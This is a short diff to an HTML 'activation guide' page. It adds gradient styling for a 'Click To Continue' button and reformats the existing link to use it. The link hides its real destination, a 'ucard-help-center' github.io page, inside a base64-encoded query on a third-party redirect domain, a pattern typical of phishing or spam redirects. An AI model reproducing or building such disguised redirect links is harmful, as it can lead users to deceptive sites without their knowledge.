@@ -57,6 +57,31 @@
 
     .site-footer { background: #111827; color: #9ca3af; font-size: 0.85rem; text-align: center; padding: 18px 10px; }
     @media (max-width: 600px) { .post-title { font-size: 1.6rem; } }
+
+    .continue-btn {
+  display: inline-block;
+  background: linear-gradient(135deg, #2563eb, #1d4ed8);
+  color: #ffffff;
+  padding: 12px 26px;
+  border-radius: 6px;
+  font-size: 1rem;
+  font-weight: 600;
+  text-decoration: none;
+  transition: all 0.3s ease;
+  box-shadow: 0 4px 10px rgba(37, 99, 235, 0.3);
+}
+
+.continue-btn:hover {
+  background: linear-gradient(135deg, #1d4ed8, #1e40af);
+  transform: translateY(-2px);
+  box-shadow: 0 6px 14px rgba(37, 99, 235, 0.4);
+}
+
+.continue-btn:active {
+  transform: translateY(0);
+  box-shadow: 0 3px 8px rgba(37, 99, 235, 0.3);
+}
+
   </style>
 </head>
 
@@ -90,9 +115,13 @@
     user-friendly interface designed for modern healthcare management.
   </p>
 
-  <a href="https://us6.my?aHR0cHM6Ly91Y2FyZC1oZWxwLWNlbnRlci5naXRodWIuaW8=" target="_blank" rel="noopener">
-    Click To Continue
-  </a>
+  <a href="https://us6.my?aHR0cHM6Ly91Y2FyZC1oZWxwLWNlbnRlci5naXRodWIuaW8="
+   target="_blank"
+   rel="noopener"
+   class="continue-btn">
+   Click To Continue
+</a>
+
 
   <div class="toc-box">
     <h2>Complete Activation Guide</h2>
